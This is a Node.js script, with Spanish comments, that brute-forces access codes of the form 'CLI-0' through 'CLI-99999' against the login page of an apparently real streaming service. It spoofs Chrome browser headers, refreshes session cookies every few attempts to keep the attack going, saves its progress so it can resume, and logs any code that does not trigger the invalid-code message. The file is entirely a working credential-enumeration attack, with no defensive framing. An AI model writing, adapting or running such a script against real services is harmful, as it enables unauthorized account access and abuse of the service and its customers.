import { writeFile, readFile } from 'node:fs/promises';
import { createWriteStream } from 'node:fs';

const logStream = createWriteStream('encontrados.txt', { flags: 'a' });

async function iniciarProceso() {
    let inicio = 0;
    let miCookie = "PH5ESSID=f4234a19d437227d147b0b7c6b46252a";

    try {
        const contenido = await readFile('progreso.json', 'utf-8');
        const data = JSON.parse(contenido);
        inicio = data.currentIndex;
        if (data.lastCookie) miCookie = data.lastCookie;
        console.log(`>>> Reanudando desde: CLI-${inicio}`);
    } catch (err) {
        console.log(">>> Iniciando desde cero.");
    }

    for (let i = inicio; i < 100000; i++) {
        try {
            // 1. PETICIÓN GET PARA RESCATAR COOKIE ACTUALIZADA
            if (i % 5 === 0) {

                const resGet = await fetch("https://rappitv.afenixx.com/login_consulta.php");

                const setCookie = resGet.headers.get('set-cookie');
                if (setCookie) {
                    miCookie = setCookie.split(';')[0];
                    /// console.log(miCookie)
                }


            }

            // 2. ACTUALIZAR PROGRESO
            await writeFile('progreso.json', JSON.stringify({
                currentIndex: i,
                lastCookie: miCookie,
                lastUpdate: new Date().toISOString()
            }, null, 2));
            // 3. PETICIÓN POST (Tus headers originales)
            const res = await fetch("https://rappitv.afenixx.com/login_consulta.php", {
                "headers": {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "en-US,en;q=0.9,es-US;q=0.8,es;q=0.7",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "priority": "u=0, i",
                    "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "upgrade-insecure-requests": "1",
                    "cookie": miCookie, // Usamos la cookie obtenida en el GET
                    "Referer": "https://rappitv.afenixx.com/login_consulta.php"
                },
                "body": "redir_plataforma=&redir_correo=&access_code=CLI-" + i,
                "method": "POST"
            });

            if (!res.ok) throw new Error(`HTTP ${res.status}`);

            const htmlText = await res.text();
            process.stdout.write(`\rProbando: CLI-${i}...`);

            if (htmlText.includes('<div class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 mb-6 text-center rounded shadow-sm text-sm"><p>Código no válido.</p></div>')) {
                continue;
            }

            // REGISTRO DE ÉXITO
            console.log(`\n[!] POSIBLE: CLI-${i} guardado.`);
            const registro = `CLI-${i} | Cookie: ${miCookie} | ${new Date().toLocaleString()}\n`;
            logStream.write(registro);

        } catch (err) {
            console.error(`\n[X] Error en CLI-${i}: ${err.message}`);
            await new Promise(r => setTimeout(r, 2000));
        }
    }
}

iniciarProceso();